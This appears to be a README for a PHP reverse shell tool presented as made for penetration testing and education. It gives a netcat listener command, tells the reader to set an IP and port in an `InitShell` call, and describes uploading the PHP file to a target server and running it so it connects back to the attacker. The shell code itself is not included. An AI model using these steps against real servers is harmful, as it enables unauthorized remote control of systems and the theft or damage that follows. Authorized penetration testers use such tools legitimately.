# PHP Reverse Shell by session1337

![PHP](https://img.shields.io/badge/PHP-Reverse%20Shell-777BB4?style=for-the-badge&logo=php&logoColor=white)
![Security](https://img.shields.io/badge/Educational-Purposes-important?style=for-the-badge)


Awesome PHP reverse shell implementation designed for penetration testing and educational purposes. This tool establishes a remote connection back to your listener.

## 🙇 Features

- **Multiple Execution Methods** - Automatically tries different PHP command execution functions
- **Cross-Platform Compatibility** - Automatically detects available shells (`bash`/`sh`)

## 😎 Usage

### 1. Setup Listener
First, start a netcat listener on your machine:

```bash
nc -lvnp 1337
```
## 2. Configure the Shell

Edit the connection parameters at the bottom of the PHP script to point to your listener:

### Locate the Configuration
Find this line at the end of the PHP file and replace it with your target IP and PORT:
```php
InitShell('IP', PORT);
```

## 3. Execute the Script

After successfully uploading the PHP file to the target server, you need to execute it to establish the reverse shell connection.


